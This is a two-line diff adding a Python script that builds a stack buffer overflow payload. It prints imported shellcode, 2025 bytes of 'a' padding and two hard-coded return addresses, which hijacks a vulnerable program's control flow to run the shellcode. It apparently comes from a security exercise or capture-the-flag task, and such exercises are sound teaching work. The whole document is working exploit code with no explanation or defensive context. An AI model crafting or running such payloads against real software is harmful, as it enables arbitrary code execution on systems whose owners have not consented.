@@ -1,0 +1,2 @@
+from shellcode import shellcode
+print (shellcode+"a"*2025+"\x18\x95\xfe\xbf"+"\xfe\x9d\x2c\xbf")
